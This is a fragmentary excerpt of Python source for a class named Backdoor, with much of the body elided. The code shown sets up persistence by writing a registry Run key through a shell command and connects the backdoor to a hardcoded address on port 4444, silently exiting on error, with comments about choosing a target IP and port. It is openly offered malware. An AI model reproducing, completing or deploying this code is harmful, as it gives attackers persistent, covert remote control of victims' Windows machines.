...
class Backdoor:
    ...
    def become_persistent(self):
        ...
        if not os.path.exists(evil_file_location):
            ...
            subprocess.call(r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "' + evil_file_location + '"',shell=True)
...
try:
    # if you want use this with python use this line
    # ip = input("Ip machine target 🧨: ")
    # port = input("Choice a target port🧨: ")
    # my_backdoor = Backdoor(ip, int(port))

    # Change by target IP
    my_backdoor = Backdoor('192.168.100.248', 4444)
    my_backdoor.run()
except Exception:
    sys.exit()
